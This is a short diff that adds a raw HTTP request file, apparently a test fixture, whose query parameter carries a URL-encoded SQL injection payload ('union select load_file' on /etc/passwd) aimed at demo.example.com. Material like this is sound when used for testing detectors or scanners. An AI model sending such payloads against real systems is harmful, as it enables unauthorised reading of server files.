@@ -1,0 +1,4 @@
+GET /a?input=1%20union%20select%20load_file(%26%2339;/etc/passwd%26%2339;) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
